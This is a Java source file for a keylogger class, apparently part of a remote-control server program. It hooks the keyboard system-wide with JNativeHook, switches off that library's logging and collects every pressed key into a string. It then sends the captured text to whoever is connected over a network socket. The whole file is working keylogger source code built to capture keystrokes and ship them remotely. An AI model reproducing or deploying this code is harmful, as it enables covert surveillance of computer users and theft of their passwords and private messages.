package Server;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.net.Socket;
import java.io.*;
import java.net.*;
import java.util.logging.Logger;
	
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.imageio.ImageIO;

import javax.swing.JList;
import javax.swing.JTextArea;
import javax.swing.JPanel;
import javax.swing.JScrollPane;

import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.util.logging.Level;
public class KeyLogger implements NativeKeyListener
{
    static public boolean is_log = false;
    static public boolean is_init = false;
    static public String res="";
    public static void init()
    {
        is_init = true;
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger());
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
    }
    //@Override
    public void nativeKeyPressed(NativeKeyEvent arg0)
    {
        if(is_log)
        {
            res += NativeKeyEvent.getKeyText(arg0.getKeyCode());
        }
    }
    public static void Start() {
        is_log = true;
    }
    public static void Stop()
    {
        is_log = false;
    }
    public static void Clear()
    {
        res = "";
    }
    public static void Show(Socket connectionSocket) throws IOException {
        OutputStream outputStream = connectionSocket.getOutputStream();
        DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
        dataOutputStream.writeUTF(res);
    }
}
